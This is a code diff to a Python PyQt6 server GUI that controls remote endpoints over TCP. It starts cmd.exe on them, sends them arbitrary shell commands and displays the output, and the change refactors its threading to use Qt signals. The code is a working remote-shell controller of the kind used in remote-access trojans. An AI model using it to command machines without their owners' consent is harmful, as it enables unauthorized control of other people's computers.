@@ -5,8 +5,14 @@ from datetime import datetime
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                              QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                              QMenu, QAbstractItemView)
-from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal
+from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject
 import struct
+
+
+class ClientSignals(QObject):
+    """子线程用来发信号，必须独立QObject子类，不能放到ClientSession"""
+    on_outp = pyqtSignal(object, str)  # sess对象，输出文本
+    on_disconnect = pyqtSignal(object)
 
 
 class ClientSession:
@@ -17,14 +23,13 @@ class ClientSession:
         self.last_pong = datetime.now()
         self.connected = True
         self._recv_buf = bytearray()
+        self.signals = ClientSignals()
 
-    # 发送完整数据包：封装4字节大端长度头
     def send_packet(self, body: bytes) -> bool:
         if not self.connected:
             return False
         try:
             body_len = len(body)
-            # 4字节大端长度
             header = struct.pack(">I", body_len)
             packet = header + body
             self.conn.sendall(packet)
@@ -42,8 +47,6 @@ class ClientSession:
 
 
 class RemoteCmdDialog(QDialog):
-    append_output = pyqtSignal(str)
-
     def __init__(self, client_session: ClientSession, parent=None):
         super().__init__(parent)
         self.setWindowTitle(f"远程CMD - {client_session.ip_str}")
@@ -63,33 +66,30 @@ class RemoteCmdDialog(QDialog):
         input_lay.addWidget(self.cmd_input)
         lay.addLayout(input_lay)
 
-        self.append_output.connect(self.out_box.append)
-        self.append_output.emit(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
-        # 对话框打开时发送 SPAW 启动cmd
+        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
         self.client.send_packet(b"SPAW")
+
+    def append_text(self, text: str):
+        """只能主线程调用"""
+        self.out_box.append(text)
 
     def on_enter_command(self):
         cmd = self.cmd_input.text().strip()
         self.cmd_input.clear()
         if not self.is_alive or not self.client.connected:
-            self.append_output.emit("\n[!] 连接断开")
+            self.out_box.append("\n[!] 连接断开")
             return
-        # EXEK + 命令字符串
         payload = b"EXEK" + cmd.encode("gbk", errors="replace")
         ok = self.client.send_packet(payload)
-        self.append_output.emit(f"> {cmd}")
+        self.out_box.append(f"> {cmd}")
         if not ok:
-            self.append_output.emit("[发送失败]")
-
-    def slot_recv_output(self, text: str):
-        self.append_output.emit(text)
+            self.out_box.append("[发送失败]")
 
     def closeEvent(self, event):
         self.is_alive = False
-        # 关闭对话框发送 KILL，终止被控端cmd进程
         if self.client.connected:
             self.client.send_packet(b"KILL")
-        self.append_output.emit("\n[*] 已发送KILL；被控端cmd进程已终止")
+        self.out_box.append("\n[*] 已发送KILL；被控端cmd进程已终止")
         super().closeEvent(event)
 
 
@@ -165,12 +165,27 @@ class MainWindow(QMainWindow):
             try:
                 conn, addr = self.server_sock.accept()
                 sess = ClientSession(conn, addr)
+                sess.signals.on_outp.connect(self.handle_session_outp)
+                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                 self.client_model.add(sess)
                 self.log(f"新被控端接入 {sess.ip_str}")
                 t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
                 t.start()
             except OSError:
                 break
+
+    def handle_session_outp(self, sess: ClientSession, text: str):
+        """主线程执行：输出回显"""
+        if sess in self.open_cmd_dialogs:
+            dlg = self.open_cmd_dialogs[sess]
+            dlg.append_text(text)
+
+    def handle_session_disconnect(self, sess: ClientSession):
+        if sess in self.open_cmd_dialogs:
+            dlg = self.open_cmd_dialogs.pop(sess)
+            dlg.append_text("\n[!] TCP连接已经断开")
+        self.client_model.remove_by_obj(sess)
+        self.log(f"被控端断开 {sess.ip_str}")
 
     def client_recv_loop(self, sess: ClientSession):
         buf = sess._recv_buf
@@ -181,20 +196,15 @@ class MainWindow(QMainWindow):
                     break
                 buf.extend(chunk)
 
-                # 二进制帧解析循环：4字节大端header + body
                 while len(buf) >= 4:
-                    # 读取4字节长度头
                     body_len = struct.unpack(">I", buf[0:4])[0]
                     total_packet_len = 4 + body_len
                     if len(buf) < total_packet_len:
-                        break  # 包没收齐，等待下一次recv
+                        break
 
-                    # 取出完整包
                     body = buf[4:total_packet_len]
-                    # 消费缓冲区
                     del buf[:total_packet_len]
 
-                    # 解析body
                     if len(body)>=4:
                         cmd_code = body[0:4]
                         if cmd_code == b"PONG":
@@ -202,21 +212,14 @@ class MainWindow(QMainWindow):
                             self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                         elif cmd_code == b"OUTP":
                             output_bytes = body[4:]
-                            # windows cmd输出GBK编码
                             out_text = output_bytes.decode("gbk", errors="replace")
-                            if sess in self.open_cmd_dialogs:
-                                dlg = self.open_cmd_dialogs[sess]
-                                dlg.slot_recv_output(out_text)
+                            # 子线程只发射信号，不碰UI
+                            sess.signals.on_outp.emit(sess, out_text)
 
             except OSError:
                 break
-
         sess.close()
-        if sess in self.open_cmd_dialogs:
-            dlg = self.open_cmd_dialogs.pop(sess)
-            dlg.slot_recv_output("\n[!] TCP连接已经断开")
-        self.client_model.remove_by_obj(sess)
-        self.log(f"被控端断开 {sess.ip_str}")
+        sess.signals.on_disconnect.emit(sess)
 
     def start_server(self):
         port = int(self.port_edit.text())
